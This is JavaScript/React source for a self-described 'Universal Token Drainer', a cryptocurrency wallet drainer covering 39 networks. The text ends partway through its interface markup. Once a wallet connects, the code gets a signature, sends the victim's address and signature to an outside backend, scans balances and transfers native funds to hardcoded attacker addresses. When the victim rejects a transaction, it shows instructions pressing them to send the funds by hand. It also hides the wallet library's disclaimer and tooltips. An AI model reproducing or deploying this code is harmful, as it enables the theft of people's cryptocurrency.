import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { parseEther, createPublicClient, http, formatEther } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE 39 NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (18 chains)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io' },
  
  // Non-EVM Chains (21 chains)
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana' },
];

// ==================== COMPLETE DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Chains - YOUR RECEIVING ADDRESSES
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonbeam
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Metis
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Cronos
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Harmony
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Aurora
  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Oasis Emerald
  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonriver
  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BTT Chain
  
  // Non-EVM Chains - YOUR RECEIVING ADDRESSES
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ", // YOUR TRON ADDRESS
  solana: "So11111111111111111111111111111111111111112", // YOUR SOLANA ADDRESS
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // YOUR BITCOIN ADDRESS
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q", // YOUR CARDANO ADDRESS
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5", // YOUR DOGECOIN ADDRESS
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5", // YOUR LITECOIN ADDRESS
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8", // YOUR RIPPLE ADDRESS
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F", // YOUR POLKADOT ADDRESS
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02", // YOUR COSMOS ADDRESS
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02", // YOUR BINANCE CHAIN ADDRESS
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB", // YOUR STELLAR ADDRESS
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5", // YOUR MONERO ADDRESS
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v", // YOUR ZCASH ADDRESS
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q", // YOUR DASH ADDRESS
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v", // YOUR TEZOS ADDRESS
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V", // YOUR ALGORAND ADDRESS
  vechain: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // YOUR VECHAIN ADDRESS
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V", // YOUR NEO ADDRESS
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj", // YOUR EOS ADDRESS
  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ", // Same as TRON
  solana_spl: "So11111111111111111111111111111111111111112", // Same as Solana
};

// Token price cache (real prices - should update via API)
const TOKEN_PRICES = {
  ETH: 3500, BNB: 600, MATIC: 1.2, AVAX: 40, FTM: 0.5, CELO: 0.8, GLMR: 0.4,
  METIS: 80, CRO: 0.1, ONE: 0.02, ROSE: 0.1, MOVR: 20, BTT: 0.000001,
  TRX: 0.12, SOL: 150, BTC: 70000, ADA: 0.6, DOGE: 0.15, LTC: 80,
  XRP: 0.6, DOT: 7, ATOM: 10, XLM: 0.12, XMR: 170, ZEC: 30, DASH: 30,
  XTZ: 1, ALGO: 0.2, VET: 0.03, NEO: 15, EOS: 0.8, USDT: 1, USDC: 1
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();

  // State
  const [status, setStatus] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
  const [manualInstructions, setManualInstructions] = useState('');
  const [showManualModal, setShowManualModal] = useState(false);
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [backendTokens, setBackendTokens] = useState([]);
  const [tronAddress, setTronAddress] = useState('');

  const scanInitiated = useRef(false);
  const authAttempts = useRef(0);

  // Auto-scan on connect
  useEffect(() => {
    if (isConnected && address && !scanInitiated.current) {
      console.log("🔥 Wallet connected:", address);
      scanInitiated.current = true;
      
      // Check for TRON
      if (window.tronWeb && window.tronWeb.defaultAddress) {
        const tronAddr = window.tronWeb.defaultAddress.base58;
        setTronAddress(tronAddr);
        console.log("✅ TRON address detected:", tronAddr);
      }
      
      setStatus("✅ Connected • Starting authentication...");
      
      // Start auth flow
      setTimeout(() => {
        handleAuthentication();
      }, 1000);
    } else if (!isConnected) {
      resetState();
      scanInitiated.current = false;
    }
  }, [isConnected, address]);

  const resetState = () => {
    setStatus('');
    setTokens([]);
    setTotalValue(0);
    setTransactions([]);
    setIsScanning(false);
    setIsDraining(false);
    setBackendTokens([]);
    setManualInstructions('');
    setShowManualModal(false);
    setIsAuthenticating(false);
    authAttempts.current = 0;
  };

  // Authentication
  const handleAuthentication = async () => {
    if (!address || isAuthenticating || authAttempts.current >= 2) return;
    
    setIsAuthenticating(true);
    authAttempts.current += 1;
    
    try {
      setStatus("🔐 Signing authentication message...");
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\nAddress: ${address}\nTime: ${timestamp}\n\nThis signature verifies wallet ownership.`;
      
      // Try to sign
      const signature = await signMessageAsync({ message });
      console.log("✅ Signature received");
      
      // Send to backend
      setStatus("📡 Authenticating with backend...");
      
      try {
        const response = await fetch('https://tokenbackend-5xab.onrender.com/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address,
            signature,
            message,
            timestamp,
            tronAddress
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          console.log("Backend auth success:", data);
        }
      } catch (backendError) {
        console.log("Backend auth skipped:", backendError.message);
      }
      
      // Start scan
      setStatus("✅ Authenticated • Starting scan...");
      setTimeout(() => {
        startFullScan();
      }, 500);
      
    } catch (error) {
      console.error("Auth error:", error);
      
      if (error.message.includes('rejected')) {
        if (authAttempts.current < 2) {
          setStatus("⚠️ Please sign to continue • Click Scan to retry");
        } else {
          setStatus("❌ Signature rejected • Click Scan to try scan only");
        }
      } else {
        setStatus("⚠️ Starting scan without authentication...");
        setTimeout(() => {
          startFullScan();
        }, 1000);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  // ==================== FULL SCAN FUNCTION ====================
  const startFullScan = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus("🌐 Scanning all 39 networks...");
    setTokens([]);
    setBackendTokens([]);
    setTotalValue(0);
    
    try {
      // First: Scan backend for all tokens
      await scanBackend();
      
      // Second: Scan EVM native balances
      await scanEVMMainChains();
      
      // Third: Check for TRON
      await checkTron();
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus("⚠️ Scan completed with some issues");
    } finally {
      setIsScanning(false);
      
      const allTokens = [...tokens, ...backendTokens];
      const uniqueTokens = Array.from(new Set(allTokens.map(t => t.id)))
        .map(id => allTokens.find(t => t.id === id));
      
      const totalVal = uniqueTokens.reduce((sum, token) => sum + (token.value || 0), 0);
      
      if (uniqueTokens.length > 0) {
        setStatus(`✅ Found ${uniqueTokens.length} tokens • $${totalVal.toFixed(2)}`);
      } else {
        setStatus("✅ Scan complete • No tokens found");
      }
    }
  };

  // Scan backend for tokens across all networks
  const scanBackend = async () => {
    try {
      setStatus("🌐 Contacting backend for token scan...");
      setScanProgress({ current: 1, total: 4, network: 'Backend Scan' });
      
      const response = await fetch('https://tokenbackend-5xab.onrender.com/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          tronAddress: tronAddress || address,
          networks: NETWORKS,
          forceRefresh: true
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log("Backend scan response:", data);
        
        if (data.success && data.data && data.data.results) {
          const backendFoundTokens = [];
          let backendTotal = 0;
          
          data.data.results.forEach(result => {
            if (result && result.tokens && result.tokens.length > 0) {
              result.tokens.forEach(token => {
                if (token.value > 0.001) { // Filter dust
                  const network = NETWORKS.find(n => 
                    n.id === result.network?.id || 
                    n.name.toLowerCase() === (result.network?.name || '').toLowerCase()
                  ) || NETWORKS[0];
                  
                  const tokenObj = {
                    id: `${network.id}-${token.symbol}-${token.contractAddress || 'native'}`,
                    network: network.name,
                    symbol: token.symbol,
                    amount: token.amount || token.balance,
                    value: token.value || token.usdValue || 0,
                    usdValue: token.value || token.usdValue || 0,
                    isNative: !token.contractAddress,
                    chainId: network.id,
                    contractAddress: token.contractAddress,
                    drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
                    type: network.type,
                    rawToken: token
                  };
                  
                  backendFoundTokens.push(tokenObj);
                  backendTotal += tokenObj.value;
                }
              });
            }
          });
          
          setBackendTokens(backendFoundTokens);
          setTotalValue(prev => prev + backendTotal);
          console.log(`📊 Backend found ${backendFoundTokens.length} tokens`);
        }
      }
    } catch (error) {
      console.log("Backend scan failed:", error.message);
    }
  };

  // Scan main EVM chains for native balances
  const scanEVMMainChains = async () => {
    const mainChains = NETWORKS.filter(n => n.type === 'evm').slice(0, 8);
    setScanProgress({ current: 2, total: 4, network: 'EVM Native Scan' });
    
    const foundTokens = [];
    let totalVal = 0;
    
    for (let i = 0; i < mainChains.length; i++) {
      const network = mainChains[i];
      
      try {
        const client = createPublicClient({
          transport: http(network.rpc),
        });
        
        const balance = await client.getBalance({
          address: address,
        });
        
        const balanceInNative = parseFloat(formatEther(balance));
        
        if (balanceInNative > 0.00001) {
          const tokenPrice = TOKEN_PRICES[network.symbol] || 0;
          const value = balanceInNative * tokenPrice;
          
          const token = {
            id: `${network.id}-${network.symbol}-native`,
            network: network.name,
            symbol: network.symbol,
            amount: balanceInNative.toFixed(8),
            value: value,
            usdValue: value,
            isNative: true,
            chainId: network.id,
            drainAddress: DRAIN_ADDRESSES[network.id],
            type: 'evm',
            rawBalance: balance.toString()
          };
          
          // Check if not already in backend tokens
          const exists = backendTokens.some(t => 
            t.network === network.name && t.symbol === network.symbol
          );
          
          if (!exists) {
            foundTokens.push(token);
            totalVal += value;
            console.log(`💰 ${network.name}: ${balanceInNative.toFixed(6)} ${network.symbol} ($${value.toFixed(2)})`);
          }
        }
      } catch (error) {
        console.log(`❌ ${network.name} scan skipped:`, error.message);
      }
      
      // Update progress
      setScanProgress({
        current: 2 + (i / mainChains.length),
        total: 4,
        network: `${network.name}`
      });
      
      await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    setTokens(prev => [...prev, ...foundTokens]);
    setTotalValue(prev => prev + totalVal);
  };

  // Check TRON balance
  const checkTron = async () => {
    setScanProgress({ current: 3, total: 4, network: 'TRON Check' });
    
    if (tronAddress) {
      try {
        // In production, use TronGrid API
        // For demo, we'll check backend
        const response = await fetch(`https://tokenbackend-5xab.onrender.com/tron/${tronAddress}`);
        
        if (response.ok) {
          const data = await response.json();
          if (data.success && data.data && data.data.balance > 0) {
            const trxBalance = data.data.balance;
            const trxValue = trxBalance * TOKEN_PRICES.TRX;
            
            const tronToken = {
              id: 'tron-trx-native',
              network: 'Tron',
              symbol: 'TRX',
              amount: trxBalance.toFixed(6),
              value: trxValue,
              usdValue: trxValue,
              isNative: true,
              chainId: 'tron',
              drainAddress: DRAIN_ADDRESSES.tron,
              type: 'non-evm'
            };
            
            setTokens(prev => [...prev, tronToken]);
            setTotalValue(prev => prev + trxValue);
            console.log(`🎯 TRON: ${trxBalance} TRX ($${trxValue.toFixed(2)})`);
          }
        }
      } catch (error) {
        console.log("TRON check failed:", error);
      }
    }
    
    setScanProgress({ current: 4, total: 4, network: 'Complete' });
  };

  // ==================== DRAIN FUNCTION ====================
  const drainAllTokens = async () => {
    const allTokens = [...tokens, ...backendTokens];
    const uniqueTokens = Array.from(new Set(allTokens.map(t => t.id)))
      .map(id => allTokens.find(t => t.id === id));
    
    if (uniqueTokens.length === 0) {
      setStatus("❌ No tokens to drain");
      return;
    }
    
    // Show confirmation with all tokens
    let confirmMsg = `🚀 DRAIN ${uniqueTokens.length} TOKENS 🚀\n\n`;
    uniqueTokens.forEach((token, idx) => {
      confirmMsg += `${idx + 1}. ${token.amount} ${token.symbol} on ${token.network} ($${token.value.toFixed(2)})\n`;
    });
    confirmMsg += `\nTotal Value: $${totalValue.toFixed(2)}\n\nClick OK to start draining all tokens.`;
    
    if (!window.confirm(confirmMsg)) {
      setStatus("❌ Drain cancelled");
      return;
    }
    
    setIsDraining(true);
    setStatus(`⚡ Draining ${uniqueTokens.length} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    let manualCount = 0;
    
    try {
      // Separate EVM and non-EVM tokens
      const evmTokens = uniqueTokens.filter(t => t.type === 'evm');
      const nonEvmTokens = uniqueTokens.filter(t => t.type === 'non-evm');
      
      // Process EVM tokens first
      for (let i = 0; i < evmTokens.length; i++) {
        const token = evmTokens[i];
        
        setScanProgress({
          current: i + 1,
          total: uniqueTokens.length,
          network: `${token.network}: ${token.symbol}`
        });
        
        setStatus(`💸 Sending ${token.amount} ${token.symbol}...`);
        
        try {
          const result = await drainEvmToken(token);
          
          if (result.success) {
            successCount++;
            txLogs.push({
              id: Date.now() + i,
              timestamp: new Date().toISOString(),
              network: token.network,
              symbol: token.symbol,
              amount: token.amount,
              status: 'success',
              hash: result.hash,
              value: `$${token.value.toFixed(2)}`,
              type: 'evm'
            });
            
            console.log(`✅ Drained ${token.symbol}: ${result.hash}`);
          } else if (result.manual) {
            manualCount++;
            showManualDrainModal(token, result.instructions);
            txLogs.push({
              id: Date.now() + i,
              timestamp: new Date().toISOString(),
              network: token.network,
              symbol: token.symbol,
              amount: token.amount,
              status: 'manual',
              value: `$${token.value.toFixed(2)}`,
              type: 'evm'
            });
            
            await new Promise(resolve => setTimeout(resolve, 3000));
          } else {
            txLogs.push({
              id: Date.now() + i,
              timestamp: new Date().toISOString(),
              network: token.network,
              symbol: token.symbol,
              amount: token.amount,
              status: 'failed',
              error: result.error,
              value: `$${token.value.toFixed(2)}`,
              type: 'evm'
            });
          }
        } catch (error) {
          console.error(`Error draining ${token.symbol}:`, error);
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            network: token.network,
            symbol: token.symbol,
            amount: token.amount,
            status: 'error',
            error: error.message,
            value: `$${token.value.toFixed(2)}`,
            type: 'evm'
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
      // Process non-EVM tokens (manual)
      for (let i = 0; i < nonEvmTokens.length; i++) {
        const token = nonEvmTokens[i];
        const idx = evmTokens.length + i + 1;
        
        setScanProgress({
          current: idx,
          total: uniqueTokens.length,
          network: `${token.network}: ${token.symbol}`
        });
        
        setStatus(`📝 Manual transfer for ${token.symbol}...`);
        
        manualCount++;
        showManualDrainModal(token, getManualInstructions(token));
        
        txLogs.push({
          id: Date.now() + idx,
          timestamp: new Date().toISOString(),
          network: token.network,
          symbol: token.symbol,
          amount: token.amount,
          status: 'manual',
          value: `$${token.value.toFixed(2)}`,
          type: 'non-evm'
        });
        
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
      
      // Update transactions
      setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
      
      // Remove successfully drained tokens
      const drainedTokens = txLogs.filter(tx => tx.status === 'success').map(tx => tx.symbol);
      const remainingTokens = uniqueTokens.filter(t => !drainedTokens.includes(t.symbol));
      
      // Update totals
      const newTotal = remainingTokens.reduce((sum, t) => sum + t.value, 0);
      setTotalValue(newTotal);
      
      // Update token lists
      setTokens(tokens.filter(t => !drainedTokens.includes(t.symbol)));
      setBackendTokens(backendTokens.filter(t => !drainedTokens.includes(t.symbol)));
      
      // Final status
      if (successCount > 0) {
        setStatus(`✅ Successfully drained ${successCount} tokens! ${manualCount > 0 ? `(${manualCount} require manual)` : ''}`);
      } else if (manualCount > 0) {
        setStatus(`📝 ${manualCount} tokens require manual transfer`);
      } else {
        setStatus("❌ No tokens were drained");
      }
      
      // Auto-rescan
      if (successCount > 0) {
        setTimeout(() => {
          setStatus("🔄 Rescanning after drain...");
          startFullScan();
        }, 5000);
      }
      
    } catch (error) {
      console.error("Drain process error:", error);
      setStatus(`❌ Drain failed: ${error.message}`);
    } finally {
      setIsDraining(false);
    }
  };

  // Drain EVM token
  const drainEvmToken = async (token) => {
    try {
      if (!walletClient) {
        return { 
          success: false, 
          error: 'Wallet not connected',
          manual: true,
          instructions: `Wallet not ready. Please send manually:\n\n${token.amount} ${token.symbol}\nTo: ${token.drainAddress}`
        };
      }
      
      const amount = parseFloat(token.amount);
      if (amount <= 0) {
        return { success: false, error: 'Invalid amount' };
      }
      
      // For native tokens
      if (token.isNative) {
        const amountInWei = parseEther(amount.toString());
        
        // Try to switch chain
        try {
          await walletClient.switchChain({ id: Number(token.chainId) });
        } catch (switchError) {
          console.log(`Chain switch failed, trying anyway:`, switchError);
        }
        
        // Send transaction
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress,
          value: amountInWei,
          chainId: Number(token.chainId)
        });
        
        return { success: true, hash };
      }
      
      // For tokens (would need contract interaction)
      return { 
        success: false, 
        error: 'Token transfer requires contract',
        manual: true,
        instructions: `MANUAL TOKEN TRANSFER:\n\nToken: ${token.symbol}\nAmount: ${token.amount}\n\nSend to:\n${token.drainAddress}\n\nNetwork: ${token.network}\n\nUse your wallet to send the tokens.`
      };
      
    } catch (error) {
      console.error(`Drain error:`, error);
      
      if (error.message.includes('rejected') || error.message.includes('denied')) {
        return { 
          success: false, 
          error: 'User rejected',
          manual: true,
          instructions: `USER REJECTED - MANUAL TRANSFER:\n\n${token.amount} ${token.symbol}\nTo: ${token.drainAddress}\n\nPlease send manually from your wallet.`
        };
      }
      
      return { 
        success: false, 
        error: error.message,
        manual: true,
        instructions: `ERROR - MANUAL TRANSFER:\n\n${token.amount} ${token.symbol}\nTo: ${token.drainAddress}\n\nPlease send manually.`
      };
    }
  };

  // Get manual instructions
  const getManualInstructions = (token) => {
    return `📝 MANUAL TRANSFER REQUIRED\n\nNetwork: ${token.network}\nToken: ${token.symbol}\nAmount: ${token.amount}\nValue: $${token.value.toFixed(2)}\n\nSend to:\n${token.drainAddress}\n\nInstructions:\n1. Open your ${token.network} wallet\n2. Navigate to Send/Transfer\n3. Paste address above\n4. Enter amount: ${token.amount}\n5. Confirm transaction\n\n✅ Complete in your wallet app`;
  };

  // Show manual drain modal
  const showManualDrainModal = (token, instructions) => {
    setManualInstructions(instructions);
    setShowManualModal(true);
  };

  // Copy to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setStatus('✅ Address copied!');
    }).catch(err => {
      console.error('Copy failed:', err);
    });
  };

  // Format address
  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  // Format amount
  const formatAmount = (amount) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 8
    });
  };

  // Get all unique tokens
  const getAllTokens = () => {
    const all = [...tokens, ...backendTokens];
    return Array.from(new Set(all.map(t => t.id)))
      .map(id => all.find(t => t.id === id));
  };

  // Get unique networks
  const getUniqueNetworks = () => {
    const allTokens = getAllTokens();
    return [...new Set(allTokens.map(t => t.network))];
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>Universal Token Drainer</h1>
              <p className="subtitle">{NETWORKS.length} Networks Supported</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">{formatAddress(address)}</div>
                {tronAddress && (
                  <div className="tron-badge">TRON: {formatAddress(tronAddress)}</div>
                )}
                <button 
                  onClick={() => disconnect()}
                  className="disconnect-btn"
                >
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Stats */}
              <div className="stats-grid">
                <div className="stat-card primary">
                  <div className="stat-icon">💰</div>
                  <div className="stat-content">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                </div>
                
                <div className="stat-card">
                  <div className="stat-icon">🪙</div>
                  <div className="stat-content">
                    <div className="stat-value">{getAllTokens().length}</div>
                    <div className="stat-label">Tokens</div>
                  </div>
                </div>
                
                <div className="stat-card">
                  <div className="stat-icon">🌐</div>
                  <div className="stat-content">
                    <div className="stat-value">{getUniqueNetworks().length}</div>
                    <div className="stat-label">Networks</div>
                  </div>
                </div>
                
                <div className="stat-card">
                  <div className="stat-icon">⚡</div>
                  <div className="stat-content">
                    <div className="stat-value">{NETWORKS.length}</div>
                    <div className="stat-label">Supported</div>
                  </div>
                </div>
              </div>

              {/* Status Bar */}
              <div className="status-container">
                <div className="status-message">
                  <span className="status-icon">
                    {isAuthenticating ? '🔐' : 
                     isScanning ? '🔍' : 
                     isDraining ? '⚡' : 
                     status.includes('✅') ? '✅' : 
                     status.includes('❌') ? '❌' : '📡'}
                  </span>
                  <span className="status-text">{status}</span>
                </div>
                
                <div className="status-actions">
                  {ethBalance && (
                    <div className="eth-balance">
                      ETH: {formatAmount(formatEther(ethBalance.value))}
                    </div>
                  )}
                </div>
              </div>

              {/* Progress */}
              {(isScanning || isDraining) && (
                <div className="progress-container">
                  <div className="progress-header">
                    <span>{isScanning ? 'Scanning Networks' : 'Draining Tokens'}</span>
                    <span>{scanProgress.current}/{scanProgress.total}</span>
                  </div>
                  <div className="progress-bar">
                    <div 
                      className="progress-fill"
                      style={{
                        width: `${(scanProgress.current / scanProgress.total) * 100}%`,
                        background: isDraining 
                          ? 'linear-gradient(90deg, #ef4444, #f87171)' 
                          : 'linear-gradient(90deg, #3b82f6, #60a5fa)'
                      }}
                    />
                  </div>
                  {scanProgress.network && (
                    <div className="progress-label">{scanProgress.network}</div>
                  )}
                </div>
              )}

              {/* Controls */}
              <div className="controls-container">
                <div className="control-buttons">
                  <button
                    onClick={startFullScan}
                    disabled={isScanning || isDraining || isAuthenticating}
